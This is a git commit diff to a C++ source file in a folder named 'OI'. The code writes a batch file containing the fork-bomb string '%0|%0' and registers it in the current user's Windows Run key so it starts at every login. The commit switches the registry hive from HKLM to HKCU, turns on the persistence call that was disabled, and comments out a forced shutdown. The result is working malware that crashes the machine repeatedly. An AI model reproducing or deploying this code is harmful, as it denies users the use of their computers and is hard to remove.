8711730ca7802da757be04424e09104d1350d384
Sandsculpture-xhy <iam_harry@163.com>
2021-12-23 13:37:46 -0600

    qwq

--- OI/Source.cpp
+++ OI/Source.cpp
@@ -5,15 +5,11 @@ char arg[8080];
 int len;
 int writeinreg()
 {
-    //找到系统的启动项
     const char *Register = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
     HKEY hKey;
-    //打开注册表启动项
-    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, Register, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, Register, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
     {
-        //添加一个子Key,并设置值，"Mytest"并不一定是应用程序名字（不加后缀.exe） ，可以自己设置；
         RegSetValueExA(hKey, "???", 0, REG_SZ, (BYTE *)arg, strlen(arg));
-        //关闭注册表
         RegCloseKey(hKey);
         // printf("succeed!\n");
         return 1;
@@ -25,7 +21,8 @@ int main(int argc, char *argv[])
 {
     //-------------------------buile bat
     freopen(".bat", "w", stdout);
-    printf("%0|%0");
+    const char *code = "%0|%0";
+    printf("%s",code);
     freopen("CON", "w", stdout);
     //-------------------------build dir
     strcpy(arg, *argv);
@@ -43,8 +40,8 @@ int main(int argc, char *argv[])
     const char *a = ".bat";
     strcat(arg, a);
     //-------------------------write in reg
-    // writeinreg();
+    writeinreg();
     //-------------------------restart
-    system("shutdown -f -p");
+    // system("shutdown -f -p");
     return 0;
 }
